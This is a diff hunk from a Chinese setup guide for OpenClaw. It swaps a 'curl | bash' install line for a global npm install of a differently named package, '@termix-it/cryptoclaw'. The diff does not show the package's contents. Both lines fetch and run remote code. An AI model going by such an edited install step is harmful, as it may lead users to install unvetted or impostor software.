@@ -70,7 +70,7 @@ sudo apt-get install -y git curl jq ca-certificates openssl
 运行 OpenClaw 安装脚本：
 
 ```bash
-curl -fsSL https://openclaw.ai/install.sh | bash
+npm install -g @termix-it/cryptoclaw@latest
 ```
 
 ## 4) 设置 nginx 将 OpenClaw 代理到端口 8000
